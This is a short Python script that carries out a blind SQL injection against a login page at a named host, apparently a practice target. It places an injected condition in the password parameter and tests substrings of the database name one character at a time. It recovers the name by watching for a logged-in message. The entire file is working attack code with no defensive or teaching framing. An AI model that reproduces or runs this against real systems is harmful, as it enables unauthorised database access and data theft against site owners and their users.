import requests
import string

# function to check if the injection was successful
def check_injection_success(response):
  if "You are logged in as" in response.text:
    return True
  else:
    return False

# function to perform the injection
def inject_sql(url, payload):
  # send the injection request
  r = requests.get(url, params=payload)
  # check if the injection was successful
  if check_injection_success(r):
    return True
  else:
    return False

# function to extract a single character from the database name
def extract_char(url, payload, pos):
  for c in string.printable:
    # modify the payload to inject a SQL query that checks for the current character
    payload['password'] = f"' OR SUBSTR((SELECT database()), {pos}, 1)='{c}' --"
    # try injecting the SQL
    if inject_sql(url, payload):
      return c
  return None

# function to extract the entire database name
def extract_db_name(url, payload):
  db_name = ""
  pos = 1
  c = extract_char(url, payload, pos)
  while c is not None:
    db_name += c
    pos += 1
    c = extract_char(url, payload, pos)
  return db_name

# the base URL for the injection
url = "http://normaltic.com:9991//login.php"

# the payload to inject
payload = {'username': 'pajji', 'password': '1234'}

# extract the database name
db_name = extract_db_name(url, payload)

print(f"The database name is: {db_name}")
